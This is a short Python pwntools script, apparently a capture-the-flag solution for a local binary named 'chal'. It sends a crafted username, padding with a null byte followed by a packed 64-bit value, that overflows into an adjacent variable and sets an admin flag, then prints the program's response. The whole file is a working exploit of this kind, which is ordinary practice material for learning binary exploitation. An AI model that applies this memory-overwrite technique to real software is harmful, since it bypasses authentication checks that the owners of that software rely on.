from pwn import *

binary = ELF('./chal')
p = process(binary.path)

# Payload is 10x 'b', and then a null byte, and then an 'A'. After that, set
# admin = 1.
payload = b'b' * 10
payload += b'\0'
payload += b'A'
payload += p64(1)


print(f"Payload: {payload}")

# USERNAME
p.sendline(payload)
# PASSWORD
p.sendline(b'rand')

# Receive and print output
print(p.recvall().decode())
